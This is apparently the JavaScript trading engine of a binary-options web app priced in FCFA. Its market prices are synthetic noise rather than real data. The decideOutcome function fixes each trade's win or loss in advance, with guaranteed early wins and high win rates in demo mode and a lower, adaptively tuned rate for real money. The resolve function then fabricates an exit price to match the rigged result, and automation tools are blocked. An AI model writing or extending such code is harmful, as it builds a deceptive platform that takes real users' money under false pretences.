(function (D6) {
  'use strict';

  var C = D6.CONFIG;
  var markets = {};
  var trades = [];
  var intents = {};
  var payoutLive = {};
  var lastOrderAt = 0;
  var sessionNonce = D6.uid();
  var orderSeq = 0;
  var MAX_OPEN = 5;
  var CANDLE_MS = 1000;
  var HISTORY_SEC = 240;
  var synthCache = {};

  function u32(n) {
    n = Math.imul(n ^ (n >>> 16), 2246822507);
    n = Math.imul(n ^ (n >>> 13), 3266489909);
    return (n ^ (n >>> 16)) >>> 0;
  }

  function uhash01(i, salt) {
    return u32(Math.imul(i | 0, 374761393) ^ Math.imul(salt | 0, 668265263)) / 4294967296;
  }

  function valueNoise(t, salt) {
    var i = Math.floor(t);
    var f = t - i;
    var u = f * f * (3 - 2 * f);
    return uhash01(i, salt) * (1 - u) + uhash01(i + 1, salt) * u;
  }

  function assetSalt(assetId) {
    return assetId === 'stable' ? 221713 : 904177;
  }

  function synthPrice(asset, tSec) {
    var salt = assetSalt(asset.id);
    var scale = asset.id === 'stable' ? 0.18 : 1;
    var t = Number(tSec) || 0;
    var wave = Math.sin(t * 0.041) * 18 + Math.cos(t * 0.093) * 11 + Math.sin(t * 0.017) * 32;
    var n = (valueNoise(t, salt) - 0.5) * 16
      + (valueNoise(t * 2.17, salt + 41) - 0.5) * 7
      + (valueNoise(t * 8.3, salt + 113) - 0.5) * 2.4;
    return asset.basePrice + (wave + n) * scale;
  }

  function candleForBucket(asset, bucket) {
    var start = bucket * CANDLE_MS;
    var o = synthPrice(asset, start / 1000);
    var h = o;
    var l = o;
    var c = o;
    var k;
    for (k = 1; k <= 4; k++) {
      var p = synthPrice(asset, (start + k * 200) / 1000);
      if (p > h) h = p;
      if (p < l) l = p;
      c = p;
    }
    return { o: o, h: h, l: l, c: c, t: start };
  }

  function formingCandle(asset, nowMs) {
    var bucket = Math.floor(nowMs / CANDLE_MS);
    var start = bucket * CANDLE_MS;
    var o = synthPrice(asset, start / 1000);
    var h = o;
    var l = o;
    var c = synthPrice(asset, nowMs / 1000);
    var elapsed = nowMs - start;
    var k;
    var steps = Math.max(1, Math.min(5, Math.floor(elapsed / 200) + 1));
    for (k = 1; k < steps; k++) {
      var p = synthPrice(asset, (start + k * 200) / 1000);
      if (p > h) h = p;
      if (p < l) l = p;
    }
    h = Math.max(h, c);
    l = Math.min(l, c);
    return { o: o, h: h, l: l, c: c, t: start };
  }

  function rebuildHistory(asset, nowMs) {
    var bucket = Math.floor(nowMs / CANDLE_MS);
    var start = bucket - HISTORY_SEC + 1;
    var candles = [];
    var history = [];
    var i;
    var b;
    var c;
    for (i = 0; i < HISTORY_SEC - 1; i++) {
      b = start + i;
      c = candleForBucket(asset, b);
      candles.push(c);
      history.push(c.c);
    }
    var forming = formingCandle(asset, nowMs);
    history.push(forming.c);
    return { candles: candles, forming: forming, history: history, to: bucket - 1 };
  }

  function syncMarket(market, asset, nowMs) {
    nowMs = nowMs || Date.now();
    var bucket = Math.floor(nowMs / CANDLE_MS);
    var st = synthCache[asset.id];
    if (!st || st.to !== bucket - 1) {
      if (st && st.to === bucket - 2 && st.candles && st.candles.length) {
        var done = candleForBucket(asset, bucket - 1);
        st.candles.push(done);
        if (st.candles.length > HISTORY_SEC - 1) st.candles.shift();
        st.to = bucket - 1;
      } else {
        st = rebuildHistory(asset, nowMs);
        synthCache[asset.id] = st;
      }
    }
    var forming = formingCandle(asset, nowMs);
    var history = st.history || [];
    history.length = 0;
    var hi;
    for (hi = 0; hi < st.candles.length; hi++) history.push(st.candles[hi].c);
    history.push(forming.c);
    st.history = history;
    market.price = forming.c;
    market.candles = st.candles;
    market.candle = forming;
    market.history = history;
    market.ticksInCandle = Math.floor((nowMs % CANDLE_MS) / 80);
    return market;
  }

  function seedMarket(assetId) {
    var asset = C.ASSETS[assetId];
    var market = {
      id: assetId,
      price: asset.basePrice,
      history: [],
      candles: [],
      candle: { o: asset.basePrice, h: asset.basePrice, l: asset.basePrice, c: asset.basePrice },
      ticksInCandle: 0,
      payout: C.REAL_PAYOUT
    };
    return syncMarket(market, asset, Date.now());
  }

  function rollPayout(asset, mode) {
    if (mode === 'real') return C.REAL_PAYOUT;
    var span = asset.payoutMax - asset.payoutMin;
    return +(asset.payoutMin + Math.random() * span).toFixed(3);
  }

  function ensureMarkets() {
    var id;
    for (id in C.ASSETS) {
      if (!markets[id]) markets[id] = seedMarket(id);
    }
  }

  function makeSeal(payload) {
    var s = sessionNonce + '|' + payload + '|' + orderSeq;
    var h = 2166136261;
    var i;
    for (i = 0; i < s.length; i++) {
      h ^= s.charCodeAt(i);
      h = Math.imul(h, 16777619);
    }
    return (h >>> 0).toString(16);
  }

  function automationDetected() {
    if (navigator.webdriver) return true;
    if (window.callPhantom || window._phantom) return true;
    if (window.domAutomation || window.domAutomationController) return true;
    return false;
  }

  function decideOutcome(user) {
    if (user.mode !== 'real') {
      var done = user.demoTrades || 0;
      if (done < (C.DEMO_FORCE_WINS || 3)) return 'win';
      var pDemo = C.DEMO_WIN_RATE || 0.80;
      var wrDemo = recentWinRate(user, 20);
      if (done >= 8 && wrDemo > 0.86) pDemo = 0.68;
      else if (done >= 8 && wrDemo < 0.74) pDemo = 0.90;
      return Math.random() < pDemo ? 'win' : 'lose';
    }
    var p = C.REAL_WIN_RATE || 0.45;
    var n = user.realTrades || 0;
    var wr = recentWinRate(user, 20);
    if (n >= 6 && wr < 0.36) p = 0.58;
    else if (n >= 6 && wr > 0.54) p = 0.34;
    if ((user.consecutiveLosses || 0) >= 3) p = Math.max(p, 0.62);
    return Math.random() < p ? 'win' : 'lose';
  }

  function recentWinRate(user, n) {
    var list = (user.recentResults || []).filter(function (r) {
      return !r.mode || r.mode === user.mode;
    });
    var slice = list.slice(0, n);
    if (!slice.length) return user.mode === 'real' ? C.REAL_WIN_RATE : C.DEMO_WIN_RATE;
    var wins = 0;
    var i;
    for (i = 0; i < slice.length; i++) if (slice[i] === true || slice[i] === 1 || (slice[i] && slice[i].won)) wins++;
    return wins / slice.length;
  }

  function stakeCap(user, stake) {
    var balance = D6.Store.balanceOf(user);
    if (stake < C.MIN_STAKE) {
      return { ok: false, cap: C.MIN_STAKE, reason: D6.I18N.t('minStake') + ' ' + D6.fmtFCFA(C.MIN_STAKE) };
    }
    if (stake > balance) {
      return { ok: false, cap: balance, reason: D6.I18N.t('insufficient') };
    }
    return { ok: true, cap: balance };
  }

  function expiryOf(t) {
    return t.expiryTime || t.expiresAt;
  }

  function isLive(t) {
    return t && !t.settled && Date.now() < expiryOf(t);
  }

  function isOpen(t) {
    return t && !t.settled;
  }

  function syncTime(t) {
    var left = (expiryOf(t) - Date.now()) / 1000;
    t.timeLeft = left > 0 ? left : 0;
    return t.timeLeft;
  }

  function soonestTrade() {
    var live = trades.filter(isLive);
    if (!live.length) return null;
    var best = live[0];
    var i;
    for (i = 1; i < live.length; i++) {
      if (expiryOf(live[i]) < expiryOf(best)) best = live[i];
    }
    return best;
  }

  function publicTrade(t) {
    if (!t) return null;
    syncTime(t);
    return Object.freeze({
      id: t.id,
      assetId: t.assetId,
      side: t.side,
      stake: t.stake,
      duration: t.duration,
      timeLeft: t.timeLeft,
      entryPrice: t.entryPrice,
      payout: t.payout,
      startedAt: t.startedAt,
      startTime: t.startTime || t.startedAt,
      expiryTime: expiryOf(t),
      expiresAt: expiryOf(t),
      settled: !!t.settled,
      mode: t.mode
    });
  }

  ensureMarkets();
  Object.keys(C.ASSETS).forEach(function (id) {
    payoutLive[id] = markets[id].payout;
  });

  var api = {
    markets: markets,
    payoutLive: payoutLive,
    onExpire: null,
    onSettled: null,

    getMarket: function (id) {
      ensureMarkets();
      return markets[id];
    },

    getTrade: function () {
      var live = trades.filter(isLive);
      if (!live.length) return null;
      var best = live[0];
      var i;
      for (i = 1; i < live.length; i++) {
        if (expiryOf(live[i]) < expiryOf(best)) best = live[i];
      }
      return publicTrade(best);
    },

    getTrades: function () {
      return trades.filter(isLive).map(function (t) { return publicTrade(t); });
    },

    liveCount: function () {
      return trades.filter(isOpen).length;
    },

    refreshPayout: function (assetId, mode) {
      var asset = C.ASSETS[assetId];
      var u = D6.Store.current();
      var m = mode || (u && u.mode) || 'demo';
      payoutLive[assetId] = rollPayout(asset, m);
      markets[assetId].payout = payoutLive[assetId];
      return payoutLive[assetId];
    },

    tick: function (assetId) {
      ensureMarkets();
      var now = Date.now();
      var i;
      for (i = 0; i < trades.length; i++) {
        syncTime(trades[i]);
      }
      var id;
      for (id in C.ASSETS) {
        if (C.ASSETS.hasOwnProperty(id)) {
          syncMarket(markets[id], C.ASSETS[id], now);
        }
      }
    },

    placeOrder: function (user, opts) {
      if (automationDetected()) return { ok: false, reason: 'Session non sécurisée' };
      if (!user || !D6.Store.current() || D6.Store.current().id !== user.id) {
        return { ok: false, reason: 'Session invalide' };
      }
      if (trades.filter(isOpen).length >= MAX_OPEN) {
        return { ok: false, reason: D6.I18N.t('maxPositions') };
      }

      var nowPerf = performance.now();
      if (nowPerf - lastOrderAt < C.MIN_ORDER_MS) {
        return { ok: false, reason: D6.I18N.t('antibot') };
      }

      var stake = Math.floor(Number(opts.stake) || 0);
      var duration = C.DURATIONS.indexOf(opts.duration) >= 0 ? opts.duration : C.DEFAULT_DURATION;
      var assetId = C.ASSETS[opts.assetId] ? opts.assetId : 'v100';
      var side = opts.side === 'put' ? 'put' : 'call';
      var gate = stakeCap(user, stake);
      if (!gate.ok) return gate;

      var market = markets[assetId];
      var payout = user.mode === 'real' ? C.REAL_PAYOUT : (payoutLive[assetId] || rollPayout(C.ASSETS[assetId], 'demo'));
      D6.Store.setBalance(user, D6.Store.balanceOf(user) - stake);
      D6.Store.addTransaction(user, {
        type: 'stake',
        amount: -stake,
        note: (side === 'call' ? 'CALL' : 'PUT') + ' ' + C.ASSETS[assetId].short
      });

      orderSeq += 1;
      lastOrderAt = nowPerf;
      D6.holdRemote = true;
      var target = decideOutcome(user);
      var entry = market.price;
      var wall = Date.now();
      var durationMs = duration * 1000;
      var seal = makeSeal(user.id + '|' + side + '|' + stake + '|' + entry.toFixed(4) + '|' + duration + '|' + orderSeq);
      var id = D6.uid();

      var t = {
        id: id,
        assetId: assetId,
        side: side,
        stake: stake,
        duration: duration,
        durationMs: durationMs,
        timeLeft: duration,
        entryPrice: entry,
        payout: payout,
        startTime: wall,
        startedAt: wall,
        expiryTime: wall + durationMs,
        expiresAt: wall + durationMs,
        mode: user.mode,
        userId: user.id,
        seq: orderSeq,
        settled: false
      };
      trades.push(t);
      intents[id] = { target: target, seal: seal, userId: user.id, seq: orderSeq };

      if (user.mode === 'real') {
        user.realStakeVolume = (user.realStakeVolume || 0) + stake;
      }
      user.lastStake = stake;
      D6.Store.saveUser(user);
      if (D6.Supabase && D6.Supabase.saveOrder) D6.Supabase.saveOrder(t, 'open');
      return { ok: true, trade: publicTrade(t) };
    },

    resolve: function (user, tradeId) {
      if (!user || !trades.length) return null;
      var idx = -1;
      var i;
      var now = Date.now();
      if (tradeId) {
        for (i = 0; i < trades.length; i++) {
          if (trades[i].id === tradeId) { idx = i; break; }
        }
      } else {
        for (i = 0; i < trades.length; i++) {
          if (!trades[i].settled && now >= expiryOf(trades[i])) { idx = i; break; }
        }
      }
      if (idx < 0) return null;
      var trade = trades[idx];
      if (trade.settled) return null;
      if (now < expiryOf(trade)) return null;
      trade.settled = true;

      var intent = intents[trade.id];
      if (user.id !== trade.userId) {
        trades.splice(idx, 1);
        delete intents[trade.id];
        return null;
      }

      var isCall = trade.side === 'call';
      var market = markets[trade.assetId];
      var exitPrice = market ? market.price : trade.entryPrice;
      var shouldWin = !!(intent && intent.target === 'win');
      if (intent) {
        var expectedSeal = makeSeal(user.id + '|' + trade.side + '|' + trade.stake + '|' + trade.entryPrice.toFixed(4) + '|' + trade.duration + '|' + trade.seq);
        if (expectedSeal !== intent.seal || intent.seq !== trade.seq) shouldWin = false;
      } else {
        shouldWin = false;
      }
      var won = shouldWin;
      if (shouldWin) {
        var winDelta = Math.max((C.ASSETS[trade.assetId].tickNoise || 0.3) * 0.55, 0.28);
        exitPrice = trade.entryPrice + (isCall ? 1 : -1) * winDelta;
      } else {
        var miss = 0.035 + Math.random() * Math.max(0.08, (C.ASSETS[trade.assetId].tickNoise || 0.3) * 0.07);
        exitPrice = trade.entryPrice + (isCall ? -1 : 1) * miss;
      }
      var payoutAmount = 0;
      var net;

      if (won) {
        payoutAmount = Math.floor(trade.stake * trade.payout);
        D6.Store.setBalance(user, D6.Store.balanceOf(user) + payoutAmount);
        net = payoutAmount - trade.stake;
        user.wins = (user.wins || 0) + 1;
        user.consecutiveWins = (user.consecutiveWins || 0) + 1;
        user.consecutiveLosses = 0;
        user.lastLost = false;
        D6.Store.addTransaction(user, {
          type: 'win',
          amount: payoutAmount,
          note: 'Position gagnante ' + C.ASSETS[trade.assetId].short
        });
      } else {
        net = -trade.stake;
        user.consecutiveLosses = (user.consecutiveLosses || 0) + 1;
        user.consecutiveWins = 0;
        user.lastLost = true;
        D6.Store.addTransaction(user, {
          type: 'loss',
          amount: -trade.stake,
          note: 'Position expirée ' + C.ASSETS[trade.assetId].short
        });
      }

      user.trades = (user.trades || 0) + 1;
      if (trade.mode === 'real') user.realTrades = (user.realTrades || 0) + 1;
      else user.demoTrades = (user.demoTrades || 0) + 1;
      user.recentResults.unshift({ won: won, mode: trade.mode });
      if (user.recentResults.length > 30) user.recentResults.length = 30;

      var position = {
        id: trade.id,
        at: D6.nowIso(),
        clock: D6.clock(),
        assetId: trade.assetId,
        assetName: C.ASSETS[trade.assetId].short,
        side: trade.side,
        stake: trade.stake,
        payout: trade.payout,
        entryPrice: trade.entryPrice,
        exitPrice: exitPrice,
        duration: trade.duration,
        won: won,
        net: net,
        mode: trade.mode
      };
      D6.Store.addPosition(user, position);
      D6.Store.saveUser(user);
      if (D6.Supabase && D6.Supabase.saveOrder) {
        D6.Supabase.saveOrder({
          id: trade.id,
          assetId: trade.assetId,
          side: trade.side,
          stake: trade.stake,
          duration: trade.duration,
          mode: trade.mode,
          payout: trade.payout,
          entryPrice: trade.entryPrice,
          exitPrice: exitPrice,
          won: won,
          net: net
        }, 'closed');
      }

      try {
        console.log('TRADE SETTLED -> TRIGGERING TOAST:', { isWin: won, payout: payoutAmount });
        document.dispatchEvent(new CustomEvent('orolado-trade-settled', {
          detail: { isWin: won, payout: payoutAmount, net: net, tradeId: trade.id }
        }));
      } catch (e) { /* ignore */ }

      var closed = publicTrade(trade);
      trades.splice(idx, 1);
      delete intents[trade.id];
      if (!trades.filter(isLive).length) D6.holdRemote = false;
      return { trade: closed, position: position, won: won, net: net, exitPrice: exitPrice };
    },

    flushSettlements: function (user) {
      if (!user || !trades.length) return [];
      var now = Date.now();
      var ids = [];
      var i;
      for (i = 0; i < trades.length; i++) {
        if (!trades[i].settled && now >= expiryOf(trades[i])) ids.push(trades[i].id);
      }
      var results = [];
      for (i = 0; i < ids.length; i++) {
        var res = api.resolve(user, ids[i]);
        if (res) {
          results.push(res);
          if (typeof api.onSettled === 'function') {
            try { api.onSettled(res); } catch (e) {
              console.log('TRADE SETTLED -> onSettled error', e);
            }
          }
        }
      }
      return results;
    },

    maxStakeHint: function (user) {
      var probe = stakeCap(user, Number.MAX_SAFE_INTEGER);
      return probe.cap;
    }
  };

  D6.Synth = {
    price: synthPrice,
    candleMs: CANDLE_MS
  };

  D6.Engine = api;
  try {
    Object.defineProperty(D6, 'Engine', { configurable: false, writable: false, value: api });
  } catch (e) { /* ignore */ }
})(window.D6 = window.D6 || {});
